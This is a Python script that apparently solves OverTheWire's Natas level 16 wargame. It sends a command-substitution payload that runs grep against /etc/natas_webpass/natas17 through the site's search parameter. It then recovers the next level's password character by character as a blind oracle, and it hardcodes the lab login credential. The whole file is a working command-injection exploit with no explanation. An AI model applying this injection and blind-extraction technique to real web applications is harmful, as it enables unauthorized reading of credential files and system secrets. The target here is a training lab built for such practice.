import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
out = "" 

for i in range(0,32) : 
    for j in characters: 
         command = f"^$(grep -o ^{out+j} /etc/natas_webpass/natas17)A"
         payload = {'needle': command, 'submit': 'Search'}

         r = requests.get('http://natas16.natas.labs.overthewire.org/index.php' , auth=HTTPBasicAuth('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo') , params=payload )

         soup = BeautifulSoup(r.text, 'html.parser')
         chu = "" 
         for link in soup.find_all('pre') : 
             chu += str(link)
             if chu.split('\n')[1] != 'African' : 
                 out += j  
                 print(out) 
                 break 

print()
print('-'*15)
print()
print(out)
